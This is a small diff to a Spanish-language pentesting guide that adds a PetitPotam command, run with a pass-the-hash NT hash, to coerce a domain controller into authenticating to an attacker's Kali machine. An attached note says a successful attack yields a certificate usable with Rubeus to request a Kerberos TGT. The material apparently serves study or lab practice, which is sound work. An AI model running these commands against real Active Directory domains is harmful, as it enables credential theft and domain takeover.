@@ -77,7 +77,10 @@ Paso 3:
 
 	# IP_Kali = Dirección IP de la máquina atacante 
 	# IP_DC   = Dirección IP del DC
-	# 
+
+# Utilizar esta manera si se tiene el HASH NT 
+❯ python3 PetitPotam.py -d domain.corp -u 'user' -hashes 
+':259745cb123a52aa2e693aaacca2db52' IP_Kali IP_DC
 
 Nota:
 	- Si el ataque fue exitoso, se obtendrá un certificado que se puede usar con Rubeus para solicitar un TGT.
